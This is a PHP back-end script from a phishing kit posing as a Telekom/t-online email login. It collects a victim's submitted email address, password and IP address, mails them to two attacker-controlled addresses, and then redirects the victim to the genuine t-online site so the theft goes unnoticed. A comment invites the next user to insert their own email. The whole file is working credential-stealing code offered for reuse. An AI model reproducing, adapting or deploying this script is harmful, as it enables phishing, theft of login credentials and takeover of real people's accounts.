<?php 
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message  = "--------------------------------------------\n";
$message .= "E-Mail : ".$_POST['pw_usr']."\n";
$message .= "Password  : ".$_POST['pw_pwd']."\n";
$message .= "Client IP : ".$ip."\n";
$message .= "---------------------------------------------\n";
//change ur email here
$send = "millerpaulhans44@gmail.com, codestaff23@yahoo.com";

$subject = "Grace Telekom";
$headers = "From: HappyThursday";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
		   header("Location: https://email.t-online.de/em");

	 
?>